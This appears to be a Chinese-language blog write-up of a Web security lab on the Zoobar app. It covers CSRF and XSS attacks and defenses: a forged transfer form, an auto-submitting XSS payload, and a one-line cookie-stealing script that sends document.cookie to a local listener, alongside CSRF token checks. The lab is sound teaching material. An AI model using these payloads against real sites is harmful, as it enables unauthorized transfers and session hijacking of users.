ailx10说：这篇是在2021年11月之前写的，后来又改过。这篇是在回头整理几年前的 Web 安全作业。刚学那会儿我挺迷茫，还买过 JavaScript 大部头，后来才发现，光看书和真正把实验跑通是两回事。我拿 Zoobar 的转账功能做例子，分别试了跨站请求、页面脚本和读取 Cookie，再去加 Referer、token、HttpOnly 这些限制。过程并不全顺利，最后有一项也没得到预期结果，所以我照样记了下来。它保留的是一次边试边理解的过程，而不是把每一步都包装成成功案例。

## E1：csrf攻击zoobar

首先在user.php文件中去除黑名单的第一行标签，在白名单中添加\<script\>

> csrf：cross-site request forgery 跨站伪造请求

用户登录后访问攻击页面，浏览器可能按 Cookie 的域、路径、SameSite 等规则携带凭证，从而使伪造请求被目标站点接收。iframe 可隐藏页面跳转，但不保证攻击一定成功。

```
<iframe name=my_iframe width=70% height=40%></iframe>
<form method=POST name=transferform action="http://www.myzoo.com/transfer.php" target="my_iframe">
<p>Send <input name=zoobars type=text value="1" size=5> zoobars</p>
<p>to <input name=recipient type=text value="attack"></p>
<input type=submit name=submission value="Send">
</form>
```

## E2：csrf防御攻击zoobar

CSRF 防护应优先在服务器端验证不可预测且与用户会话绑定的 token，并结合 SameSite Cookie、Origin 或 Referer 检查等措施。Referer 可能缺失，不能作为唯一防护。

```
<?php
session_start();
$_SESSION["csrf"] = bin2hex(random_bytes(32));
?>
```

2）在session中产生一个随机数

```
// token 已在 session_start() 后生成。
// 实际应用应在适当时机生成并保存，避免每次请求覆盖。
```

3）将生成的值放在表单中

```
<input type="hidden" name="csrf" value="<?= htmlspecialchars($_SESSION['csrf'], ENT_QUOTES, 'UTF-8') ?>">
```

4）用户提交表单验证提交的token是否和session中保存的值一致

```
if (!isset($_POST["csrf"], $_SESSION["csrf"]) ||
    !is_string($_POST["csrf"]) ||
    !hash_equals($_SESSION["csrf"], $_POST["csrf"])) {
    http_response_code(403);
    exit("CSRF validation failed");
}
// 随后继续验证业务条件并执行操作。
```

## E3：xss攻击zoobar

> xss：cross sitescript 跨站脚本攻击

通过js创建自提交表单

```
<script>
var f=document.createElement("form");
document.body.appendChild(f);
 
var a=document.createElement("input");
a.type="hidden";
a.type="text";
a.value="1";
a.name="zoobars";
f.appendChild(a);
 
var b=document.createElement("input");
b.type="hidden";
b.type="text";
b.name="recipient"
b.value="aa";
f.appendChild(b);
 
var c=document.createElement("input");
c.type="hidden";
c.name="submission";
c.value="Send";
f.appendChild(c);
 
f.method="POST";
f.name="transferform";
f.action="http://www.myzoo.com/transfer.php";
f.submit();
</script>
```

## E4：xss防御攻击zoobar

XSS 和 CSRF 的防护并不相同。XSS 防护应按输出上下文进行编码，避免不可信输入进入可执行上下文，并结合安全的 DOM API 和内容安全策略。

## E5：xss攻击cookie

当不可信内容被作为脚本执行时，脚本可能读取非 HttpOnly Cookie。下例仅用于本地实验。

```
<script>
document.write("<img src=http://127.0.0.1:2002?cookie="+document.cookie+">");
</script>
```
